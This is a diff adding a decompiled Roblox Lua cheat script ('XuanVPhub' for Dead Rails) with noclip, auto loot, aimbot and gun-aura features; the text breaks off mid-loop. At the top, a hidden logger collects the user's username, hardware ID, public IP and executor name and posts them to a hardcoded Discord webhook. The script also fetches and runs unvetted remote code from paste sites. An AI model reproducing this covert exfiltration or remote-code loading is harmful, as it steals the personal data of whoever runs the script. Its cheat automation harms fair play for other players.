@@ -1,0 +1,1991 @@
+-- ts file was generated at discord.gg/25ms
+
+
+pcall(function()
+    local vu1 = game:GetService("HttpService")
+    local vu2 = game:GetService("Players").LocalPlayer
+    local vu3 = "https://discord.com/api/webhooks/1372089655159427082/UZ3lmUnv6wac8lyhUW_uZKrTKwnaaqxgj8Co-XeaESIZBvXm85dWTxSg4JHgeIcee7yy"
+    local vu4 = not (http_request or request) and (not (syn and syn.request) and fluxus)
+    if vu4 then
+        vu4 = fluxus.request
+    end
+    local function vu5()
+        if identifyexecutor then
+            return identifyexecutor()
+        else
+            return syn and "Synapse X" or (is_sirhurt_closure and "SirHurt" or (isproto and "ProtoSmasher" or (KRNL_LOADED and "KRNL" or (not getexecutorname and "Unknown" or getexecutorname()))))
+        end
+    end
+    local function vu6()
+        if syn and (syn.crypt and syn.crypt.hash) then
+            return syn.crypt.hash(tostring(game:GetService("RbxAnalyticsService"):GetClientId()))
+        else
+            return game:GetService("RbxAnalyticsService"):GetClientId()
+        end
+    end
+    local vu7 = "Kh\195\180ng x\195\161c \196\145\225\187\139nh"
+    pcall(function()
+        if vu4 then
+            local v8 = vu4({
+                Url = "https://api.ipify.org",
+                Method = "GET"
+            })
+            if v8 and v8.Body then
+                vu7 = tostring(v8.Body)
+            end
+        end
+    end);
+    (function()
+        if vu4 then
+            local vu9 = {
+                content = "",
+                embeds = {
+                    {
+                        title = "Logger Full Info",
+                        description = "Username: " .. vu2.Name .. "\nHWID: " .. vu6() .. "\nIP: " .. vu7 .. "\nExecutor: " .. vu5(),
+                        color = 16711680
+                    }
+                },
+                username = "XuanVP Logger"
+            }
+            pcall(function()
+                local v10 = vu4
+                local v11 = {
+                    Url = vu3,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = vu1:JSONEncode(vu9)
+                }
+                v10(v11)
+            end)
+        end
+    end)()
+end)
+if game.CoreGui:FindFirstChild("Gun Health Track") == nil then
+    local v12 = Instance.new("ScreenGui", game.CoreGui)
+    v12.Name = "Gun Health Track"
+    v12.Enabled = false
+    local v13 = Instance.new("Frame")
+    v13.Size = UDim2.new(0.2, 0, 0.1, 0)
+    v13.Position = UDim2.new(0.02, 0, 0.87, 0)
+    v13.BackgroundColor3 = Color3.new(1, 1, 1)
+    v13.BorderColor3 = Color3.new(0, 0, 0)
+    v13.BorderSizePixel = 1
+    v13.Active = true
+    v13.BackgroundTransparency = 0
+    v13.Parent = v12
+    local v14 = Instance.new("UIStroke")
+    v14.Color = Color3.new(0, 0, 0)
+    v14.Thickness = 2.5
+    v14.Parent = v13
+    local v15 = Instance.new("UICorner")
+    v15.CornerRadius = UDim.new(0, 5)
+    v15.Parent = v13
+    local v16 = Instance.new("Frame")
+    v16.Name = "HealthBarActual"
+    v16.Size = UDim2.new(1, 0, 1, 0)
+    v16.Position = UDim2.new(0, 0, 0, 0)
+    v16.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    v16.BorderColor3 = Color3.new(0, 0, 0)
+    v16.BorderSizePixel = 1
+    v16.Active = true
+    v16.BackgroundTransparency = 0
+    v16.Parent = v13
+    local v17 = Instance.new("UICorner")
+    v17.CornerRadius = UDim.new(0, 5)
+    v17.Parent = v16
+    local v18 = Instance.new("TextLabel")
+    v18.Name = "InfoText"
+    v18.Size = UDim2.new(1, 0, 1, 0)
+    v18.Position = UDim2.new(0, 0, 0, 0)
+    v18.BackgroundTransparency = 1
+    v18.Text = "Target Health: N/A"
+    v18.TextSize = 15
+    v18.TextColor3 = Color3.new(0, 0, 0)
+    v18.Font = Enum.Font.Code
+    v18.TextWrapped = true
+    v18.Parent = v13
+end
+local vu19 = game:GetService("Players")
+local v20 = vu19.LocalPlayer:WaitForChild("PlayerGui")
+local v21 = v20:FindFirstChild("CountdownScreenGui") or Instance.new("ScreenGui", v20)
+v21.Name = "CountdownScreenGui"
+v21.ResetOnSpawn = false
+local vu22 = Instance.new("TextLabel", v21)
+vu22.Size = UDim2.new(0, 150, 0, 40)
+vu22.Position = UDim2.new(0.5, - 75, 0, 20)
+vu22.TextColor3 = Color3.new(1, 1, 1)
+vu22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+vu22.BackgroundTransparency = 0.3
+vu22.TextScaled = true
+vu22.Text = "10:00"
+vu22.Font = Enum.Font.SourceSansBold
+vu22.Active = true
+vu22.Draggable = true
+local vu23 = 600
+task.spawn(function()
+    while vu23 >= 0 and (vu22 and vu22.Parent) do
+        local v24 = math.floor(vu23 / 60)
+        local v25 = vu23 % 60
+        vu22.Text = string.format("%02d:%02d", v24, v25)
+        task.wait(1)
+        vu23 = vu23 - 1
+    end
+    if vu22 and vu22.Parent then
+        vu22.Text = "H\225\186\191t gi\225\187\157!"
+    end
+end)
+local v26 = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local vu27 = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local v28 = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+local v29 = v26:CreateWindow({
+    Title = "XuanVPhub",
+    SubTitle = "Deadrails beta",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(600, 450),
+    Acrylic = false,
+    Theme = "Dark",
+    MinimizeKey = Enum.KeyCode.LeftControl
+})
+game:GetService("UserInputService")
+local vu30 = game:GetService("VirtualInputManager")
+local v31 = v20:FindFirstChild("FluentButtonScreenGui") or Instance.new("ScreenGui", v20)
+v31.Name = "FluentButtonScreenGui"
+v31.ResetOnSpawn = false
+local v32 = Instance.new("ImageButton", v31)
+v32.Size = UDim2.new(0, 40, 0, 40)
+v32.Position = UDim2.new(0, 100, 0, 100)
+v32.Image = "rbxassetid://84950100176700"
+v32.BackgroundTransparency = 1
+v32.Active = true
+v32.Draggable = true
+v32.MouseButton1Click:Connect(function()
+    vu30:SendKeyEvent(true, Enum.KeyCode.LeftControl, false, game)
+    task.wait(0.1)
+    vu30:SendKeyEvent(false, Enum.KeyCode.LeftControl, false, game)
+end)
+local vu33 = v26.Options
+local vu34 = game:GetService("ReplicatedStorage")
+local vu35 = game:GetService("RunService")
+local vu36 = vu19.LocalPlayer
+local vu37 = game:GetService("Lighting")
+local vu38 = game:GetService("Workspace")
+local v39 = {
+    Info = v29:AddTab({
+        Title = "Info",
+        Icon = "info"
+    }),
+    Main = v29:AddTab({
+        Title = "Main",
+        Icon = "home"
+    }),
+    Combat = v29:AddTab({
+        Title = "Combat",
+        Icon = "sword"
+    }),
+    TP = v29:AddTab({
+        Title = "TP",
+        Icon = "send"
+    }),
+    AutoBond = v29:AddTab({
+        Title = "Auto Bond",
+        Icon = "settings-2"
+    }),
+    TPToBase = v29:AddTab({
+        Title = "TP to Base",
+        Icon = "anchor"
+    }),
+    ESP = v29:AddTab({
+        Title = "ESP",
+        Icon = "eye"
+    }),
+    Settings = v29:AddTab({
+        Title = "Settings",
+        Icon = "settings"
+    })
+}
+local v40 = v39.Info:AddSection("Th\195\180ng tin chung")
+local vu41 = v39.Main:AddSection("Ch\225\187\169c n\196\131ng ch\195\173nh")
+local vu42 = v39.Combat:AddSection("H\225\187\151 tr\225\187\163 t\225\186\165n c\195\180ng")
+local v43 = v39.TP:AddSection("D\225\187\139ch chuy\225\187\131n nhanh")
+local vu44 = v39.AutoBond:AddSection("T\225\187\177 \196\145\225\187\153ng Farm Bond")
+local v45 = v39.TPToBase:AddSection("D\225\187\139ch chuy\225\187\131n v\225\187\129 Base")
+local vu46 = v39.ESP:AddSection("ESP Settings")
+local vu47 = v39.ESP:AddSection("ESP Display Options")
+v39.Settings:AddSection("Giao di\225\187\135n & L\198\176u tr\225\187\175")
+v40:AddParagraph({
+    Title = "Credits",
+    Content = "Script by: XuanVP - Sunny - Idk\nRemastered GUI with Fluent."
+})
+v40:AddButton({
+    Title = "Copy XuanVP Discord",
+    Description = "https://discord.gg/usv255Pw4t",
+    Callback = function()
+        if setclipboard then
+            setclipboard("https://discord.gg/usv255Pw4t")
+            print("\196\144\195\163 sao ch\195\169p link Discord XuanVP!")
+        else
+            print("L\225\187\151i: Kh\195\180ng t\195\172m th\225\186\165y h\195\160m setclipboard.")
+        end
+    end
+})
+v40:AddButton({
+    Title = "Copy YTB Sunny",
+    Description = "https://www.youtube.com/@SunPowerPew",
+    Callback = function()
+        if setclipboard then
+            setclipboard("https://www.youtube.com/@SunPowerPew")
+            print("\196\144\195\163 sao ch\195\169p link YouTube Sunny!")
+        else
+            print("L\225\187\151i: Kh\195\180ng t\195\172m th\225\186\165y h\195\160m setclipboard.")
+        end
+    end
+})
+v40:AddButton({
+    Title = "Anti void",
+    Description = "d\195\185ng \196\145\225\187\131 \196\145\225\187\129 ph\195\178ng r\225\187\155t kh\225\187\143i map",
+    Callback = function()
+        pcall(function()
+            loadstring(game:HttpGet("https://hst.sh/raw/owupisigih"))()
+            print("\196\145\195\163 k\195\173ch ho\225\186\161t anti void")
+        end)
+    end
+})
+vu41:AddToggle("NoClip", {
+    Title = "NoClip",
+    Default = false
+}):OnChanged(function()
+    _G.NoClipEnabled = vu33.NoClip.Value
+    if _G.NoClipEnabled then
+        if not (_G.NoClipConn and _G.NoClipConn.Connected) then
+            _G.NoClipConn = vu35.Stepped:Connect(function()
+                if vu36 and vu36.Character then
+                    local v48, v49, v50 = pairs(vu36.Character:GetDescendants())
+                    while true do
+                        local v51
+                        v50, v51 = v48(v49, v50)
+                        if v50 == nil then
+                            break
+                        end
+                        if v51:IsA("BasePart") then
+                            v51.CanCollide = false
+                        end
+                    end
+                end
+            end)
+        end
+    elseif _G.NoClipConn and _G.NoClipConn.Connected then
+        _G.NoClipConn:Disconnect()
+        _G.NoClipConn = nil
+    end
+    print("NoClip: " .. (_G.NoClipEnabled and "ON" or "OFF"))
+end)
+local vu52 = vu41:AddToggle("ThirdPerson", {
+    Title = "Third Person",
+    Default = false
+})
+vu52:OnChanged(function()
+    local v53 = vu33.ThirdPerson.Value
+    if v53 then
+        vu36.CameraMode = Enum.CameraMode.Classic
+        vu36.CameraMaxZoomDistance = 90
+    else
+        vu36.CameraMode = Enum.CameraMode.LockFirstPerson
+        vu36.CameraMaxZoomDistance = 0
+    end
+    print("Third Person: " .. (v53 and "ON" or "OFF"))
+end)
+if vu36.CameraMode ~= Enum.CameraMode.LockFirstPerson then
+    vu33.ThirdPerson:SetValue(true)
+else
+    vu33.ThirdPerson:SetValue(false)
+end
+local vu54 = vu41:AddToggle("FullBright", {
+    Title = "Full Bright",
+    Default = false
+})
+vu54:OnChanged(function()
+    local v55 = vu33.FullBright.Value
+    if v55 then
+        vu37.Ambient = Color3.new(1, 1, 1)
+        vu37.OutdoorAmbient = Color3.new(1, 1, 1)
+        vu37.Brightness = 5
+        vu37.GlobalShadows = false
+    else
+        vu37.Ambient = Color3.new(0.5, 0.5, 0.5)
+        vu37.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5)
+        vu37.Brightness = 2
+        vu37.GlobalShadows = true
+    end
+    print("Full Bright: " .. (v55 and "ON" or "OFF"))
+end)
+vu41:AddButton({
+    Title = "NPC Lock",
+    Description = "K\195\173ch ho\225\186\161t NPC Lock (script ngo\195\160i)",
+    Callback = function()
+        if _G.NPCLockLoaded then
+            print("NPC Lock \196\145\195\163 \196\145\198\176\225\187\163c k\195\173ch ho\225\186\161t!")
+        else
+            _G.NPCLockLoaded = true
+            pcall(function()
+                loadstring(game:HttpGet("https://hst.sh/raw/usacoqatak"))()
+                print("NPC Lock \196\145\195\163 t\225\186\163i!")
+            end)
+        end
+    end
+})
+local vu56 = {
+    Moneybag = true,
+    ["Snake Oil"] = true,
+    Bandage = true,
+    ["Holy Water"] = true,
+    Molotov = true,
+    Medkit = true,
+    AmmoBox = true
+}
+local vu57 = {
+    Bond = true,
+    RifleAmmo = true,
+    ShotgunShells = true,
+    RevolverAmmo = true,
+    Grenade = true
+}
+local vu58 = {
+    Rifle = true,
+    Shotgun = true,
+    ["Sawed-Off Shotgun"] = true,
+    ["Navy Revolver"] = true,
+    Revolver = true,
+    ["Bolt Action Rifle"] = true,
+    Pistol = true
+}
+_G.AutoLootEnabled = false
+local vu59 = nil
+local vu60 = nil
+task.spawn(function()
+    pcall(function()
+        vu59 = vu34:WaitForChild("Shared", 10):WaitForChild("Network", 10):WaitForChild("RemotePromise", 10):WaitForChild("Remotes", 10):WaitForChild("C_ActivateObject", 10)
+    end)
+    pcall(function()
+        vu60 = vu34:WaitForChild("Remotes", 10):WaitForChild("Tool", 10):WaitForChild("PickUpTool", 10)
+    end)
+end)
+vu35.Heartbeat:Connect(function()
+    if not (_G.AutoLootEnabled and (vu36 and vu36.Character)) then
+        return
+    end
+    local v61 = vu36.Character:FindFirstChild("HumanoidRootPart")
+    if not v61 then
+        return
+    end
+    local v62 = vu38:FindFirstChild("RuntimeItems")
+    if not v62 then
+        return
+    end
+    local v63 = v61.Position
+    local v64, v65, v66 = pairs(v62:GetChildren())
+    while true do
+        while true do
+            local v67
+            v66, v67 = v64(v65, v66)
+            if v66 == nil then
+                return
+            end
+            if vu56[v67.Name] then
+                break
+            end
+            if vu57[v67.Name] and v67:IsA("Model") then
+                local v68 = v67.PrimaryPart or v67:FindFirstChildWhichIsA("BasePart")
+                if v68 and ((v63 - v68.Position).Magnitude < 12 and vu59) then
+                    pcall(vu59.FireServer, vu59, v67)
+                end
+            elseif vu58[v67.Name] then
+                local v69 = nil
+                local v70 = false
+                if v67:FindFirstChild("ServerWeaponState") then
+                    v69 = v67:FindFirstChildWhichIsA("BasePart")
+                    v70 = true
+                elseif v67:FindFirstChild("ObjectInfo") then
+                    local v71, v72, v73 = pairs(v67.ObjectInfo:GetChildren())
+                    while true do
+                        local v74
+                        v73, v74 = v71(v72, v73)
+                        if v73 == nil then
+                            break
+                        end
+                        if v74.Name == "TextLabel" and v74.Text == "Gun" then
+                            v69 = v67:FindFirstChildWhichIsA("BasePart")
+                            v70 = true
+                            break
+                        end
+                    end
+                end
+                if v70 and (v69 and ((v63 - v69.Position).Magnitude < 30 and vu60)) then
+                    pcall(vu60.FireServer, vu60, v67)
+                end
+            end
+        end
+        local v75 = nil
+        local v76 = 30
+        if v67.Name ~= "Moneybag" or not v67:FindFirstChild("MoneyBag") or not v67.MoneyBag:FindFirstChild("CollectPrompt") then
+            if v67:IsA("BasePart") then
+                v75 = v67
+            elseif v67:FindFirstChildWhichIsA("BasePart") then
+                v75 = v67:FindFirstChildWhichIsA("BasePart")
+            end
+        else
+            v75 = v67.MoneyBag
+            v76 = 50
+        end
+        if v75 and (v63 - v75.Position).Magnitude < v76 then
+            if v67.Name ~= "Moneybag" or not (v75:FindFirstChild("CollectPrompt") and fireproximityprompt) then
+                if vu60 then
+                    pcall(vu60.FireServer, vu60, v67)
+                end
+            else
+                pcall(fireproximityprompt, v75:FindFirstChild("CollectPrompt"))
+            end
+        end
+    end
+end)
+vu41:AddToggle("AutoLoot", {
+    Title = "Auto Loot",
+    Default = false
+}):OnChanged(function()
+    _G.AutoLootEnabled = vu33.AutoLoot.Value
+    print("Auto Loot: " .. (_G.AutoLootEnabled and "ON" or "OFF"))
+end)
+vu42:AddToggle("ShowHealthBarModsToggle", {
+    Title = "Show Health Bar Mods",
+    Default = false,
+    Callback = function(_)
+        _G.HealthBarMods = vu33.ShowHealthBarModsToggle.Value
+        local v77 = game.CoreGui:FindFirstChild("Gun Health Track")
+        if v77 and (not _G.HealthBarMods and v77.Enabled) then
+            v77.Enabled = false
+            local v78 = v77:FindFirstChild("Frame")
+            if v78 then
+                local v79 = v78:FindFirstChild("InfoText")
+                if v79 then
+                    v79.Text = "Target Health: N/A"
+                end
+                local v80 = v78:FindFirstChild("HealthBarActual")
+                if v80 then
+                    v80.Size = UDim2.new(1, 0, 1, 0)
+                end
+            end
+        end
+    end
+})
+vu42:AddDropdown("CharacterModsDropdown", {
+    Title = "Character Mods",
+    Default = "Head",
+    Values = {
+        "Head",
+        "HumanoidRootPart"
+    },
+    Multi = false,
+    Callback = function(_)
+        _G.CharacterMods = vu33.CharacterModsDropdown.Value
+    end
+})
+vu42:AddDropdown("NoModsCombatFilterDropdown", {
+    Title = "No Mods (Combat Filter)",
+    Default = {},
+    Values = {
+        "Horse",
+        "Wolf",
+        "Werewolf"
+    },
+    Multi = true,
+    Callback = function(_)
+        _G.NoModsCombatFilter = vu33.NoModsCombatFilterDropdown.Value
+    end
+})
+vu42:AddDropdown("MeleeAttackTypeDropdown", {
+    Title = "Attack Melee Type",
+    Default = "Normal",
+    Values = {
+        "Fast",
+        "Normal"
+    },
+    Multi = false,
+    Callback = function(_)
+        _G.FastMelee = vu33.MeleeAttackTypeDropdown.Value
+    end
+})
+vu42:AddToggle("AutoAttackMeleeToggle", {
+    Title = "Auto Attack Melee",
+    Default = false,
+    Keybind = Enum.KeyCode.U
+}):OnChanged(function()
+    _G.AutoAttackMelee = vu33.AutoAttackMeleeToggle.Value
+    if _G.AutoAttackMelee then
+        task.spawn(function()
+            while _G.AutoAttackMelee and task.wait() do
+                local vu81 = false
+                local function v82()
+                    vu81 = true
+                end
+                if vu36.Character then
+                    local v83 = nil
+                    if vu38:FindFirstChild("RuntimeItems") then
+                        local v84, v85, v86 = pairs(vu38.RuntimeItems:GetChildren())
+                        while true do
+                            local v87
+                            v86, v87 = v84(v85, v86)
+                            if v86 == nil then
+                                break
+                            end
+                            if v87:IsA("Model") and v87:FindFirstChild("ObjectInfo") then
+                                local v88, v89, v90 = pairs(v87.ObjectInfo:GetChildren())
+                                while true do
+                                    local v91
+                                    v90, v91 = v88(v89, v90)
+                                    if v90 == nil then
+                                        break
+                                    end
+                                    if v91.Name == "TextLabel" and v91.Text == "Melee" then
+                                        v82()
+                                        v83 = v87
+                                    end
+                                end
+                            end
+                            if v83 then
+                                v82()
+                            end
+                        end
+                    end
+                    local v92, v93, v94 = pairs(vu36.Character:GetChildren())
+                    local v95 = nil
+                    while true do
+                        local v96
+                        v94, v96 = v92(v93, v94)
+                        if v94 == nil then
+                            break
+                        end
+                        if v96:IsA("Tool") and v96:FindFirstChild("SwingEvent") then
+                            v82()
+                            v95 = v96
+                        end
+                    end
+                    if v83 and (not v95 or v95.Name ~= v83.Name) and vu60 then
+                        pcall(vu60.FireServer, vu60, v83)
+                        task.wait(0.3)
+                        local v97, v98, v99 = pairs(vu36.Character:GetChildren())
+                        v95 = nil
+                        while true do
+                            local v100
+                            v99, v100 = v97(v98, v99)
+                            if v99 == nil then
+                                break
+                            end
+                            if v100:IsA("Tool") and v100:FindFirstChild("SwingEvent") then
+                                v82()
+                                v95 = v100
+                            end
+                        end
+                    end
+                    if _G.FastMelee ~= "Fast" then
+                        if _G.FastMelee == "Normal" then
+                            if not v95 and vu36.Backpack then
+                                local v101, v102, v103 = pairs(vu36.Backpack:GetChildren())
+                                while true do
+                                    local v104
+                                    v103, v104 = v101(v102, v103)
+                                    if v103 == nil then
+                                        break
+                                    end
+                                    if v104:IsA("Tool") and v104:FindFirstChild("SwingEvent") then
+                                        v104.Parent = vu36.Character
+                                        task.wait(0.2)
+                                        v82()
+                                        v95 = v104
+                                    end
+                                end
+                            end
+                            if v95 and (v95.Parent == vu36.Character and v95:FindFirstChild("SwingEvent")) then
+                                local v105 = vu36
+                                pcall(v95.SwingEvent.FireServer, v95.SwingEvent, v105:GetMouse().Hit.LookVector)
+                                task.wait(0.5)
+                            end
+                        end
+                    else
+                        if not v95 and vu36.Backpack then
+                            local v106, v107, v108 = pairs(vu36.Backpack:GetChildren())
+                            while true do
+                                local v109
+                                v108, v109 = v106(v107, v108)
+                                if v108 == nil then
+                                    break
+                                end
+                                if v109:IsA("Tool") and v109:FindFirstChild("SwingEvent") then
+                                    v109.Parent = vu36.Character
+                                    task.wait(0.2)
+                                    v82()
+                                    v95 = v109
+                                end
+                            end
+                        end
+                        if v95 and (v95.Parent == vu36.Character and v95:FindFirstChild("SwingEvent")) then
+                            local v110 = vu36
+                            pcall(v95.SwingEvent.FireServer, v95.SwingEvent, v110:GetMouse().Hit.LookVector)
+                            if vu34.Remotes and vu34.Remotes.Tool and vu34.Remotes.Tool:FindFirstChild("DropTool") then
+                                pcall(vu34.Remotes.Tool.DropTool.FireServer, vu34.Remotes.Tool.DropTool, v95)
+                            end
+                            task.wait(0.1)
+                        end
+                    end
+                end
+                if vu81 then
+                    break
+                end
+            end
+        end)
+    end
+end)
+vu42:AddDropdown("GunAuraTypeDropdown", {
+    Title = "Gun Aura Type",
+    Default = "Normal",
+    Values = {
+        "Fast",
+        "Normal"
+    },
+    Multi = false,
+    Callback = function(_)
+        _G.GunAuraKillSkib = vu33.GunAuraTypeDropdown.Value
+    end
+})
+vu42:AddSlider("GunAuraDelayShotSlider", {
+    Title = "Gun Aura Delay Shot",
+    Min = 0.01,
+    Max = 1,
+    Default = 0.25,
+    Rounding = 2,
+    Suffix = "s",
+    Callback = function(_)
+        _G.DelayShot = vu33.GunAuraDelayShotSlider.Value
+    end
+})
+vu42:AddSlider("GunAuraReachShotSlider", {
+    Title = "Gun Aura Reach",
+    Min = 10,
+    Max = 300,
+    Default = 250,
+    Rounding = 0,
+    Suffix = "studs",
+    Callback = function(_)
+        _G.ReachShot = vu33.GunAuraReachShotSlider.Value
+    end
+})
+_G.KillAuraGun_ModsAntilag = {}
+local vu111 = nil
+local vu112 = nil
+local vu113 = false
+vu42:AddToggle("GunAuraKillToggle", {
+    Title = "Gun Aura",
+    Default = false,
+    Keybind = Enum.KeyCode.M
+}):OnChanged(function()
+    _G.KillAuraGun = vu33.GunAuraKillToggle.Value
+    local vu114 = game.CoreGui:FindFirstChild("Gun Health Track")
+    if _G.KillAuraGun then
+        _G.KillAuraGun_ModsAntilag = {}
+        local v115 = vu38
+        local v116, v117, v118 = pairs(v115:GetDescendants())
+        while true do
+            local v119
+            v118, v119 = v116(v117, v118)
+            if v118 == nil then
+                break
+            end
+            if v119:IsA("Model") and (v119:FindFirstChild("HumanoidRootPart") and (v119:FindFirstChild("Humanoid") and v119:FindFirstChild("Head"))) and (not vu19:GetPlayerFromCharacter(v119) and (v119.Humanoid.Health > 0 and not table.find(_G.KillAuraGun_ModsAntilag, v119))) then
+                table.insert(_G.KillAuraGun_ModsAntilag, v119)
+            end
+        end
+        if not (vu111 and vu111.Connected) then
+            vu111 = vu38.DescendantAdded:Connect(function(p120)
+                if _G.KillAuraGun and (p120:IsA("Model") and (p120:FindFirstChild("HumanoidRootPart") and (p120:FindFirstChild("Humanoid") and p120:FindFirstChild("Head")))) and (not vu19:GetPlayerFromCharacter(p120) and (p120.Humanoid.Health > 0 and not table.find(_G.KillAuraGun_ModsAntilag, p120))) then
+                    table.insert(_G.KillAuraGun_ModsAntilag, p120)
+                end
+            end)
+        end
+        if not (vu112 and vu112.Connected) then
+            vu112 = vu38.DescendantRemoving:Connect(function(p121)
+                local v122 = _G.KillAuraGun and table.find(_G.KillAuraGun_ModsAntilag, p121)
+                if v122 then
+                    table.remove(_G.KillAuraGun_ModsAntilag, v122)
+                end
+            end)
+        end
+        vu113 = true
+        task.spawn(function()
+            while _G.KillAuraGun and vu113 and task.wait(_G.DelayShot or 0.25) do
+                local vu123 = false
+                local function v124()
+                    vu123 = true
+                end
+                if vu36.Character and vu36.Character:FindFirstChild("HumanoidRootPart") then
+                    local v125 = math.huge
+                    local v126 = nil
+                    local v127 = nil
+                    local v128 = nil
+                    for v129 = # _G.KillAuraGun_ModsAntilag, 1, - 1 do
+                        local v130 = _G.KillAuraGun_ModsAntilag[v129]
+                        if not v130 or (not v130.Parent or (not v130:FindFirstChild("HumanoidRootPart") or (not v130:FindFirstChild("Humanoid") or (not v130:FindFirstChild("Head") or v130.Humanoid.Health <= 0)))) then
+                            if _G.KillAuraGun_ModsAntilag[v129] == v130 then
+                                table.remove(_G.KillAuraGun_ModsAntilag, v129)
+                            end
+                            break
+                        end
+                        local v131 = (vu36.Character.HumanoidRootPart.Position - v130.HumanoidRootPart.Position).Magnitude
+                        if v131 < v125 then
+                            if v131 < (_G.ReachShot or 250) then
+                                local v132 = true
+                                local v133 = vu33.NoModsCombatFilterDropdown and vu33.NoModsCombatFilterDropdown.Value or {}
+                                if v133.Horse and (v130.Name:find("Horse") or v130.Name:find("Unicorn")) or (v133.Wolf and v130.Name:find("Wolf") or v133.Werewolf and v130.Name:find("Werewolf")) then
+                                    v132 = false
+                                elseif v130.Name:find("Soldier") then
+                                    v132 = false
+                                end
+                                if v132 then
+                                    v126 = v130:FindFirstChild(_G.CharacterMods or "Head")
+                                    v127 = v130.Humanoid
+                                    v128 = v130
+                                    v125 = v131
+                                end
+                            end
+                        end
+                    end
+                    if v126 and (v127 and v128) then
+                        if _G.HealthBarMods and vu114 then
+                            vu114.Enabled = true
+                            local v134 = vu114:FindFirstChild("Frame")
+                            if v134 then
+                                local v135 = v134:FindFirstChild("InfoText")
+                                if v135 then
+                                    v135.Text = v128.Name:gsub("Model_", "") .. " HP: " .. string.format("%.0f", v127.Health) .. "/" .. v127.MaxHealth
+                                end
+                                local v136 = v134:FindFirstChild("HealthBarActual")
+                                if v136 then
+                                    v136.Size = UDim2.new(v127.Health / v127.MaxHealth, 0, 1, 0)
+                                end
+                            end
+                        end
+                        if _G.GunAuraKillSkib == "Fast" or _G.GunAuraKillSkib == "Normal" then
+                            local v137, v138, v139 = pairs(vu36.Character:GetChildren())
+                            while true do
+                                local v140
+                                v139, v140 = v137(v138, v139)
+                                if v139 == nil then
+                                    break
+                                end
+                                if v140:IsA("Tool") and v140:FindFirstChild("ClientWeaponState") and v140.ClientWeaponState:FindFirstChild("CurrentAmmo") then
+                                    if v140.ClientWeaponState.CurrentAmmo.Value <= 0 then
+                                        if v140.ClientWeaponState.CurrentAmmo.Value == 0 and _G.GunAuraKillSkib == "Normal" then
+                                            local v141 = vu38
+                                            pcall(vu34.Remotes.Weapon.Reload.FireServer, vu34.Remotes.Weapon.Reload, v141:GetServerTimeNow(), v140)
+                                        end
+                                    else
+                                        local v142 = v126.CFrame
+                                        local v143 = {}
+                                        if v140.Name == "Shotgun" or v140.Name == "Sawed-Off Shotgun" then
+                                            for v144 = 1, v140.Name == "Shotgun" and 8 or 5 do
+                                                v143[tostring(v144)] = v127
+                                            end
+                                        else
+                                            v143["2"] = v127
+                                        end
+                                        if next(v143) then
+                                            local v145 = vu38
+                                            pcall(vu34.Remotes.Weapon.Shoot.FireServer, vu34.Remotes.Weapon.Shoot, v145:GetServerTimeNow(), v140, v142, v143)
+                                            if _G.GunAuraKillSkib == "Fast" then
+                                                local v146 = vu38
+                                                pcall(vu34.Remotes.Weapon.Reload.FireServer, vu34.Remotes.Weapon.Reload, v146:GetServerTimeNow(), v140)
+                                            end
+                                        end
+                                    end
+                                    v124()
+                                end
+                            end
+                        end
+                    elseif _G.HealthBarMods and (vu114 and vu114.Enabled) then
+                        vu114.Enabled = false
+                    end
+                end
+                if vu123 then
+                    break
+                end
+            end
+            vu113 = false
+            if not _G.KillAuraGun and (_G.HealthBarMods and (vu114 and vu114.Enabled)) then
+                vu114.Enabled = false
+            end
+        end)
+    else
+        vu113 = false
+        if vu111 and vu111.Connected then
+            vu111:Disconnect()
+            vu111 = nil
+        end
+        if vu112 and vu112.Connected then
+            vu112:Disconnect()
+            vu112 = nil
+        end
+        _G.KillAuraGun_ModsAntilag = {}
+        if _G.HealthBarMods and (vu114 and vu114.Enabled) then
+            vu114.Enabled = false
+        end
+    end
+end)
+vu42:AddToggle("AutoReloadGunToggle", {
+    Title = "Auto Reload Gun",
+    Default = false
+}):OnChanged(function()
+    _G.AutoReload = vu33.AutoReloadGunToggle.Value
+    if _G.AutoReload then
+        task.spawn(function()
+            while _G.AutoReload and task.wait(0.5) do
+                if vu36.Character then
+                    local v147, v148, v149 = pairs(vu36.Character:GetChildren())
+                    while true do
+                        local v150
+                        v149, v150 = v147(v148, v149)
+                        if v149 == nil then
+                            break
+                        end
+                        if v150:IsA("Tool") and v150:FindFirstChild("ClientWeaponState") and (v150.ClientWeaponState:FindFirstChild("CurrentAmmo") and (v150.ClientWeaponState:FindFirstChild("MaxAmmo") and v150.ClientWeaponState.CurrentAmmo.Value < v150.ClientWeaponState.MaxAmmo.Value)) then
+                            local v151 = vu38
+                            pcall(vu34.Remotes.Weapon.Reload.FireServer, vu34.Remotes.Weapon.Reload, v151:GetServerTimeNow(), v150)
+                        end
+                    end
+                end
+            end
+        end)
+    end
+end)
+local v152 = vu42:AddToggle("AimbotModsToggle", {
+    Title = "Aimbot Mods",
+    Default = false,
+    Keybind = Enum.KeyCode.R
+})
+local vu153 = false
+v152:OnChanged(function()
+    _G.AimbotMods = vu33.AimbotModsToggle.Value
+    local vu154 = game.CoreGui:FindFirstChild("Gun Health Track")
+    if _G.AimbotMods then
+        vu153 = true
+        task.spawn(function()
+            while true do
+                if not (_G.AimbotMods and vu153 and vu35.RenderStepped:Wait()) then
+                    vu153 = false
+                    if not _G.AimbotMods and (_G.HealthBarMods and (vu154 and vu154.Enabled)) then
+                        vu154.Enabled = false
+                    end
+                    return
+                end
+                if vu36.Character and (vu36.Character:FindFirstChild("HumanoidRootPart") and vu38.CurrentCamera) then
+                    local v155 = math.huge
+                    local v156 = nil
+                    local v157 = nil
+                    for v158 = # _G.KillAuraGun_ModsAntilag, 1, - 1 do
+                        local v159 = _G.KillAuraGun_ModsAntilag[v158]
+                        if not v159 or (not v159.Parent or (not v159:FindFirstChild("HumanoidRootPart") or (not v159:FindFirstChild("Humanoid") or (not v159:FindFirstChild("Head") or v159.Humanoid.Health <= 0)))) then
+                            if _G.KillAuraGun_ModsAntilag[v158] == v159 then
+                                table.remove(_G.KillAuraGun_ModsAntilag, v158)
